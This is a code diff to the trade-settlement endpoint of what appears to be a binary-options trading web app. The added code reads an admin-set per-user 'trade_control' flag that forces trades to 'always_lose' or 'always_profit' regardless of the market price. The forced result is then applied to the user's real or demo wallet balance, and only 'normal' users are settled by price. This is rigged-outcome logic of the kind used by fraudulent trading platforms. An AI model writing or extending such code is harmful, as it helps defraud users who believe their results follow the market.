@@ -964,22 +964,33 @@ def api_process_expired_trade(trade_id):
         trade.exit_price = current_price
         trade.closed_at = datetime.utcnow()
         
-        # Determine win/loss
-        if trade.trade_type == 'call':
-            won = current_price > trade.entry_price
-        else:  # put
-            won = current_price < trade.entry_price
-        
-        # Update trade status and calculate profit/loss
+        # Check admin control settings first
+        trade_control = current_user.trade_control if current_user else 'normal'
         from decimal import Decimal
         
-        if won:
-            trade.status = 'won'
+        if trade_control == 'always_lose':
+            # Force trade to lose regardless of market outcome
+            trade.status = 'lose'
+            trade.profit_loss = -Decimal(str(trade.amount))
+        elif trade_control == 'always_profit':
+            # Force trade to win regardless of market outcome
+            trade.status = 'profit'
             profit = Decimal(str(trade.amount)) * (Decimal(str(trade.payout_percentage)) / Decimal('100'))
             trade.profit_loss = profit
         else:
-            trade.status = 'lost'
-            trade.profit_loss = -Decimal(str(trade.amount))
+            # Normal trading - determine win/loss based on market price
+            if trade.trade_type == 'call':
+                won = current_price > trade.entry_price
+            else:  # put
+                won = current_price < trade.entry_price
+            
+            if won:
+                trade.status = 'profit'
+                profit = Decimal(str(trade.amount)) * (Decimal(str(trade.payout_percentage)) / Decimal('100'))
+                trade.profit_loss = profit
+            else:
+                trade.status = 'lose'
+                trade.profit_loss = -Decimal(str(trade.amount))
         
         # Update user balance
         wallet = current_user.wallet
@@ -1003,8 +1014,14 @@ def api_process_expired_trade(trade_id):
         
         return jsonify({
             'success': True,
-            'trade_result': trade.status,
-            'profit_loss': float(trade.profit_loss),
+            'trade': {
+                'id': trade.id,
+                'status': trade.status,
+                'profit_loss': float(trade.profit_loss),
+                'asset': trade.asset,
+                'trade_type': trade.trade_type,
+                'amount': float(trade.amount)
+            },
             'new_balance': float(wallet.demo_balance if trade.is_demo else wallet.balance)
         })
         
